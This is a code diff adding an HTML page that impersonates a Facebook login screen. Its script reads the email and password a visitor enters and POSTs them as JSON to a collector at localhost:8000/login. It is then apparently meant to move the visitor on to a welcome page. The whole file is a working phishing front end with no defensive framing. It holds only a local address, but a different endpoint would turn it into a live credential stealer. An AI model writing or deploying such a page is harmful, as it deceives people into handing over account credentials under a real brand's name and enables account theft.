@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <h1>Welcome To Facebook</h1>
+    Enter Email: <input type="email" id="email">
+    Enter Password: <input type="password" id="password">
+    <a href="/welcome.html"><button onclick="sendCredentials()">Login To Facebook</button></a>
+    <script>
+        function sendCredentials() {
+            let user_email = document.getElementById("email").value;
+            let user_password = document.getElementById("password").value;
+            let credentials = { user_email: user_email, user_password: user_password }
+            fetch("http://localhost:8000/login", {
+                method: "POST",
+                body: JSON.stringify({ credentials }),
+                headers: {
+                    "Content-Type": "application/json",
+                },
+            });
+        }
+
+
+    </script>
+</body>
+
+</html>
